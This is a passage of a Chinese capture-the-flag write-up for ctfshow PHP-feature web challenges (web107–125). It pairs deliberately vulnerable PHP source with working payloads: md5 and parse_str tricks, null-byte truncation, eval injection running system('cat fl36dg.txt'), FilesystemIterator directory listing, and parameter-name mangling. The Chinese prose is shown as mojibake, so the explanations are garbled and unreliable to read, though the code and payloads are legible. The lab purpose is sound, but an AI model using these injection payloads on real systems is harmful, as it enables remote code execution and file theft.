<p>æ¯è¿›è¡Œä¸€æ¬¡å¾ªç¯è¿­ä»£ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™ $value å˜é‡ï¼Œå¹¶ä¸”æ•°ç»„æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼Œç›´åˆ°åˆ°è¾¾æœ€åä¸€ä¸ªæ•°ç»„å…ƒç´ ã€‚<br>getä¼ å…¥ä¸€ä¸ªå€¼ï¼ŒæŠŠå€¼èµ‹ç»™keyï¼Œå¦‚æœkey&#x3D;&#x3D;=errorè¾“å‡ºâ€what are you doing?!â€œåœæ­¢å‡½æ•°ã€‚å¦åˆ™æŠŠå€¼èµ‹ç»™value<br>postä¼ å…¥ä¸€ä¸ªå€¼ï¼ŒæŠŠå€¼èµ‹ç»™keyï¼Œå¦‚æœkey&#x3D;&#x3D;=flagè¾“å‡ºâ€what are you doing?!â€œåœæ­¢å‡½æ•°ã€‚å¦åˆ™æŠŠå€¼èµ‹ç»™value<br>å¦‚æœpostä¼ å…¥çš„flagä¸$flagç›¸ç­‰ã€‚ç»™æˆ‘ä»¬flag<br>payload:</p>
<blockquote>
<p>GET:<br>?x&#x3D;flag<br>POST:<br>error&#x3D;x</p>
</blockquote>
<h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
       <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>postæ–¹å¼ä¼ å…¥v1ï¼Œgetæ–¹å¼ä¼ å…¥v3ã€‚<br><code>parse_str(\$v1,\$v2);</code>å°†v1çš„å†…å®¹å½“ä½œv2çš„å‚æ•°ã€‚<br><code> if($v2[&#39;flag&#39;]==md5($v3))&#123;</code>v2çš„flagå‚æ•°çš„å€¼å€¼ç­‰äºä¼ å…¥çš„v3ä¼ å…¥å‚æ•°çš„MD5åŠ å¯†åçš„å€¼<br>payloadï¼š<br>GETï¼š?v3&#x3D;2<br>POSTï¼šv1&#x3D;flag&#x3D;c81e728d9d4c2f636f067f89cc14862c<br>å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/0a7356866de6432faeb98ab83664f174.png" alt="1"></p>
<h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//0x36d=877</span>
    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>^æ˜¯å¼€å§‹ä½ç½®ï¼Œ$æ˜¯ç»“æŸä½ç½®ã€‚<br><code>if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  &#123;</code><br>åœ¨getä¼ å…¥å‚æ•°ä¸­æŸ¥çœ‹æ˜¯å¦æ˜¯a-zA-Zå¼€å¤´çš„ï¼Œå¦‚æœæ˜¯è¿”å›trueã€‚è¦ç»•è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œå¿…é¡»ä½¿ä¸ºtrueã€‚ç„¶åæ‰èƒ½ä¸æ‰§è¡Œdieå‡½æ•°ã€‚<br><code>if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&#123;</code>å°†ä¼ å…¥çš„å€¼å€’ç½®å¼±ç±»å‹åˆ¤æ–­æ˜¯å¦æ˜¯æ•´æ•°877<br>payloadï¼š<code>?c=a%00778</code>(%00æˆªæ–­æ¼æ´)<br><img src="https://img-blog.csdnimg.cn/3a66812e55b34ce78493c509e02c84fe.png" alt="2"></p>
<h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>v1å’Œv2ä¼ å…¥çš„å€¼è‹¥å«æœ‰å­—æ¯åˆ™æ‰§è¡Œeval()å‡½æ•°ã€‚<br>payloadï¼š<code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>æˆ–<code>?v1=ReflectionClass&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code>ã€‚å¾—åˆ°flagã€‚</p>
<blockquote>
<p><strong>?v1&#x3D;ReflectionClass&amp;v2&#x3D;system(â€œcat fl36dg.txtâ€)</strong><br>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯ä½¿ç”¨PHPçš„åå°„æœºåˆ¶æ¥è·å–ä¸€ä¸ªç”±æ‰§è¡Œâ€lsâ€å‘½ä»¤çš„ç»“æœè¿”å›çš„ç±»çš„ä¿¡æ¯ï¼Œå¹¶å°†è¯¥ä¿¡æ¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚<br>å…·ä½“åœ°ï¼Œè¿™æ®µä»£ç ä½¿ç”¨äº†PHPçš„åå°„ç±»ReflectionClassæ¥è·å–ç”±system(â€œlsâ€)å‘½ä»¤æ‰§è¡Œè¿”å›çš„ç±»çš„ä¿¡æ¯ã€‚å…¶ä¸­ï¼Œsystem(â€œlsâ€)æ‰§è¡Œäº†ä¸€ä¸ªshellå‘½ä»¤â€lsâ€ï¼Œå¹¶å°†å…¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚åå°„ç±»ReflectionClassé€šè¿‡æ¥æ”¶ä¸€ä¸ªç±»åå‚æ•°æ¥è·å–è¯¥ç±»çš„ä¿¡æ¯ï¼Œè¿™é‡Œçš„ç±»åå°±æ˜¯ç”±â€lsâ€å‘½ä»¤è¿”å›çš„ç»“æœã€‚</p>
</blockquote>
<blockquote>
<p><code>?v1=Exception&amp;v2=system(&quot;cat fl36dg.txt&quot;)</code><br>è¯¥å‘½ä»¤ä½¿ç”¨PHPè¯­è¨€ä¸­çš„system()å‡½æ•°æ¥æ‰§è¡Œlså‘½ä»¤ï¼Œå¹¶å°†ç»“æœä¼ é€’ç»™Exceptionç±»çš„æ„é€ å‡½æ•°ï¼Œç„¶åå°†è¯¥å¼‚å¸¸å®ä¾‹ä¼ é€’ç»™echoè¯­å¥ã€‚<br>æ¢å¥è¯è¯´ï¼Œè¯¥å‘½ä»¤çš„æ„æ€æ˜¯åœ¨PHPè„šæœ¬ä¸­æ‰§è¡Œlså‘½ä»¤ï¼Œå°†å…¶ç»“æœä½œä¸ºå‚æ•°ä¼ é€’ç»™Exceptionç±»çš„æ„é€ å‡½æ•°ï¼Œç„¶åå°†è¿™ä¸ªå¼‚å¸¸å¯¹è±¡è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœlså‘½ä»¤æ‰§è¡Œå‡ºé”™ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªå¼‚å¸¸å¹¶æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p>
</blockquote>
<h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>ä¸æ„§æ˜¯phpç‰¹æ€§ï¼Œéƒ½æ²¡è§è¿‡ï¼ï¼</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œæ–°äº†è§£åˆ°ä¸€ä¸ªphpå‡½æ•°<br><strong>FilesystemIterator</strong>ç”¨æ¥åˆ›å»ºå½“å‰ç›®å½•çš„è¿­ä»£å™¨ã€‚<br><strong>getcwd</strong>è·å–å½“å‰å·¥ä½œç›®å½•<br><img src="https://img-blog.csdnimg.cn/0f75cdbef7f64326b050074b58979d04.png" alt="1"><br>payload:<br><code>?v1=FilesystemIterator&amp;v2=getcwd</code><br><img src="https://img-blog.csdnimg.cn/8c05431e2cff4c28863fa30926446d1a.png" alt="2"><br>è®¿é—®æ–‡ä»¶å¾—åˆ°flagã€‚</p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/2310602538cb43ab9e19ec98fe2c2ef2.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/270988a18f6d41919e68794c19bbb57b.png" alt="2"><br>å¥½åƒæ²¡è¿‡æ»¤<strong>\f</strong></p>
<p>payloadï¼š<br>GETï¼š?num&#x3D;%0c36</p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>$a</code>åœ¨æœ¬é¢˜ä¸­æ²¡ç”¨ï¼Œéœ€è¦ä¼ å…¥CTF_SHOWï¼ŒCTF_SHOW.COMå¹¶ä¸”ä¸ä¼ å…¥fl0gã€‚<br>payloadï¼š<code>POST CTF_SHOW=1&amp;CTF_SHOW.COM=2&amp;fun=echo $flag</code>ä½†æ˜¯ä¸æˆåŠŸï¼ŒåŸæ¥æ˜¯æŠŠ<code>.</code>ç»™è¿‡æ»¤æ‰äº†ã€‚è¿™é‡Œäº†è§£åˆ°phpçš„ä¸€ä¸ªç‰¹æ€§phpæ ‡å˜é‡ååªå…è®¸æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œå½“postæˆ–getä¼ å…¥çš„æ—¶å€™ï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ï¼Œ+ï¼Œ[  åˆ™ä¼šè½¬åŒ–ä¸º_ï¼Œä½†æ˜¯å¦‚æœä¼ å…¥[  ä¹‹åä»–ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ­¤æ—¶åé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥è€Œä¸ä¼šè¢«æ›¿æ¢ã€‚<br>payloadï¼š<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag</code></p>
<h2 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
         <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$c</span></span>"</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string double-quoted-string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
